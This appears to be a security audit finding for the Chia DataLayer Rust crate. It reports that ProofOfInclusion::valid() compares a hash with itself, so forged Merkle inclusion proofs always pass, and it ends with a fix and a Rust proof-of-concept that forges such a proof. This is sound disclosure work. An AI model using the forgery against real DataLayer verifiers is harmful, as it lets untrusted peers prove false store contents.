### Title
`ProofOfInclusion::valid()` Has a Tautological Root Check — Forged Inclusion Proofs Always Pass - (File: `crates/chia-datalayer/src/merkle/proof_of_inclusion.rs`)

### Summary

The `ProofOfInclusion::valid()` function in the DataLayer Merkle proof module contains a tautological final check: it compares `existing_hash` against `self.root_hash()`, but `root_hash()` returns the last `layer.combined_hash`, which is exactly the value `existing_hash` was just set to inside the loop. The check is always `true` when layers are present, and also always `true` when layers are empty (both sides reduce to `self.node_hash`). As a result, any attacker-crafted `ProofOfInclusion` — with arbitrary `node_hash` and arbitrary `layers` — passes `valid()` as long as each layer's `combined_hash` is internally self-consistent. No external root is ever verified.

### Finding Description

`ProofOfInclusion` is defined in `crates/chia-datalayer/src/merkle/proof_of_inclusion.rs`:

```rust
pub struct ProofOfInclusion {
    pub node_hash: Hash,
    pub layers: Vec<ProofOfInclusionLayer>,
}
```

The `valid()` method:

```rust
pub fn valid(&self) -> bool {
    let mut existing_hash = self.node_hash;
    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash {
            return false;
        }
        existing_hash = calculated_hash;
    }
    existing_hash == self.root_hash()
}
```

And `root_hash()`:

```rust
pub fn root_hash(&self) -> Hash {
    if let Some(last) = self.layers.last() {
        last.combined_hash
    } else {
        self.node_hash
    }
}
```

**Case 1 — empty `layers`:** The loop does not execute. `existing_hash` remains `self.node_hash`. `root_hash()` also returns `self.node_hash`. The final check is `self.node_hash == self.node_hash` — always `true`. Any `ProofOfInclusion` with no layers is unconditionally valid for any `node_hash`.

**Case 2 — non-empty `layers`:** After the loop, `existing_hash` holds the last `calculated_hash`. The loop body already verified `calculated_hash == layer.combined_hash`, so `existing_hash` equals the last `layer.combined_hash`. `root_hash()` also returns the last `layer.combined_hash`. The final check is therefore `last_combined_hash == last_combined_hash` — always `true`.

The `combined_hash` field in `ProofOfInclusionLayer` serves dual purposes: (1) it is the per-layer computed hash that is verified against the calculation, and (2) it is simultaneously used as the "expected root" via `root_hash()`. This dual use makes the final root check circular and meaningless — the analog of the Bridge report's `receivedAt` field being used both as a proof-status indicator and as a suspension-state store, causing the check to be trivially satisfied.

### Impact Explanation

An attacker can construct a `ProofOfInclusion` claiming that any arbitrary `node_hash` (representing any key-value pair) is included in any DataLayer store. They populate `layers` with a self-consistent chain of hashes (each `combined_hash` correctly computed from the previous hash and a chosen `other_hash`). The final `combined_hash` can be set to any value — it becomes the "root" of the forged proof. Any code that calls `proof.valid()` without separately comparing `proof.root_hash()` against a known, trusted tree root will accept the forged proof.

`ProofOfInclusion` derives `Streamable` and is exposed via Python bindings (`from_bytes`, `from_json_dict`, `parse_rust`). It is a first-class public API type. The `valid()` method is the sole verification entry point named and documented for this purpose.

This matches the allowed High impact: **DataLayer Merkle proof logic accepts forged inclusion, letting untrusted input prove invalid state.**

### Likelihood Explanation

- `ProofOfInclusion` is fully serializable and deserializable from external bytes via the Python wheel.
- The method name `valid()` strongly implies complete proof validation; callers have no reason to suspect a separate root check is required.
- The fuzz target and all tests call `valid()` only on proofs generated from the blob itself (where the root is implicitly correct), so the tautology is never exercised adversarially in the test suite.
- Any DataLayer client that receives a proof from an untrusted peer and calls `proof.valid()` is vulnerable.

### Recommendation

Replace the tautological final check with a comparison against a caller-supplied expected root. Change the signature of `valid()` to accept the expected root:

```rust
pub fn valid_against_root(&self, expected_root: &Hash) -> bool {
    let mut existing_hash = self.node_hash;
    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash {
            return false;
        }
        existing_hash = calculated_hash;
    }
    &existing_hash == expected_root
}
```

Alternatively, if the no-argument `valid()` must be preserved for internal use, add a clear doc comment warning that it does not verify against any external root, and add a separate `valid_against_root(expected: &Hash) -> bool` for external callers.

### Proof of Concept

```rust
use chia_datalayer::{Hash, Side};
use chia_datalayer::merkle::proof_of_inclusion::{ProofOfInclusion, ProofOfInclusionLayer};
use chia_protocol::Bytes32;

fn forge_proof(fake_node_hash: [u8; 32], fake_other_hash: [u8; 32]) -> ProofOfInclusion {
    let node_hash = Hash(Bytes32::new(fake_node_hash));
    let other_hash = Hash(Bytes32::new(fake_other_hash));
    // Compute a combined_hash that is internally consistent
    let combined_hash = chia_datalayer::calculate_internal_hash(&node_hash, Side::Right, &other_hash);
    ProofOfInclusion {
        node_hash,
        layers: vec![ProofOfInclusionLayer {
            other_hash_side: Side::Right,
            other_hash,
            combined_hash,
        }],
    }
}

fn main() {
    // Forge a proof for an arbitrary node_hash not in any real tree
    let proof = forge_proof([0xde; 32], [0xad; 32]);
    // valid() returns true — no real root is checked
    assert!(proof.valid(), "forged proof passes valid()");
    // The attacker-controlled "root" is proof.root_hash()
    println!("Forged root: {:?}", proof.root_hash());
}
```

The forged proof passes `valid()` unconditionally. Any DataLayer verifier that trusts `valid()` alone will accept this as proof that `[0xde; 32]` is included in the tree whose root is `proof.root_hash()`.
